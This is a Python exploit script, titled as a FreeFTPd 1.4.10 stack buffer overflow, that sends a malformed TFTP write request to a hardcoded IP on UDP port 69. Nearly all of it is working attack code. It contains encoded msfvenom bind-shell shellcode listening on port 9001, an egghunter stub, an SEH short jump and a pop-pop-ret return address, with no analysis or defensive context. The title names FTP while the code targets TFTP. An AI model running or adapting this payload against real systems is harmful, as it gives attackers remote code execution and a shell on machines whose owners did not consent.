# Exploit Title: FreeFTPd Stack Buffer Overflow (SEH + Egghunter)
# Author: Pal1Sec
# Version: 1.4.10
# Tested on: Windows XP, SP3
#!/usr/bin/python
import socket
import sys

host = '192.168.136.129'
port = 69

try:
	s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

except:
	print "socket() failed"
	sys.exit(1)

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20\x2f"

filename  = "A" * 230 
filename += "W00TW00T"
filename += "\x90" * 28 
filename += ("\xba\xbc\x8a\x1e\x3a\xdd\xc4\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x53\x31\x50\x12\x83\xe8\xfc\x03\xec\x84\xfc\xcf\xf0\x71\x82"
"\x30\x08\x82\xe3\xb9\xed\xb3\x23\xdd\x66\xe3\x93\x95\x2a\x08"
"\x5f\xfb\xde\x9b\x2d\xd4\xd1\x2c\x9b\x02\xdc\xad\xb0\x77\x7f"
"\x2e\xcb\xab\x5f\x0f\x04\xbe\x9e\x48\x79\x33\xf2\x01\xf5\xe6"
"\xe2\x26\x43\x3b\x89\x75\x45\x3b\x6e\xcd\x64\x6a\x21\x45\x3f"
"\xac\xc0\x8a\x4b\xe5\xda\xcf\x76\xbf\x51\x3b\x0c\x3e\xb3\x75"
"\xed\xed\xfa\xb9\x1c\xef\x3b\x7d\xff\x9a\x35\x7d\x82\x9c\x82"
"\xff\x58\x28\x10\xa7\x2b\x8a\xfc\x59\xff\x4d\x77\x55\xb4\x1a"
"\xdf\x7a\x4b\xce\x54\x86\xc0\xf1\xba\x0e\x92\xd5\x1e\x4a\x40"
"\x77\x07\x36\x27\x88\x57\x99\x98\x2c\x1c\x34\xcc\x5c\x7f\x51"
"\x21\x6d\x7f\xa1\x2d\xe6\x0c\x93\xf2\x5c\x9a\x9f\x7b\x7b\x5d"
"\xdf\x51\x3b\xf1\x1e\x5a\x3c\xd8\xe4\x0e\x6c\x72\xcc\x2e\xe7"
"\x82\xf1\xfa\x92\x8a\x54\x55\x81\x77\x26\x05\x05\xd7\xcf\x4f"
"\x8a\x08\xef\x6f\x40\x21\x98\x8d\x6b\x6e\x70\x1b\x8d\x1a\x92"
"\x4d\x05\xb2\x50\xaa\x9e\x25\xaa\x98\xb6\xc1\xe3\xca\x01\xee"
"\xf3\xd8\x25\x78\x78\x0f\xf2\x99\x7f\x1a\x52\xce\xe8\xd0\x33"
"\xbd\x89\xe5\x19\x55\x29\x77\xc6\xa5\x24\x64\x51\xf2\x61\x5a"
"\xa8\x96\x9f\xc5\x02\x84\x5d\x93\x6d\x0c\xba\x60\x73\x8d\x4f"
"\xdc\x57\x9d\x89\xdd\xd3\xc9\x45\x88\x8d\xa7\x23\x62\x7c\x11"
"\xfa\xd9\xd6\xf5\x7b\x12\xe9\x83\x83\x7f\x9f\x6b\x35\xd6\xe6"
"\x94\xfa\xbe\xee\xed\xe6\x5e\x10\x24\xa3\x7f\xf3\xec\xde\x17"
"\xaa\x65\x63\x7a\x4d\x50\xa0\x83\xce\x50\x59\x70\xce\x11\x5c"
"\x3c\x48\xca\x2c\x2d\x3d\xec\x83\x4e\x14")
filename += "A" * (1492-230-8-130-28-355)
filename += "B" * (130-50)
filename += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
filename += "C" * (50-32)
filename += "\xeb\x80\x90\x90"        # short jmp negative 128
filename += "\x05\x96\x40"            # 00409605 pop ebx # pop ebp # ret in TFTPServerSP.exe

mode = "netascii"
evil = "\x00\x02" + filename + "\0" + mode + "\0"
s.sendto(evil, (host, port))
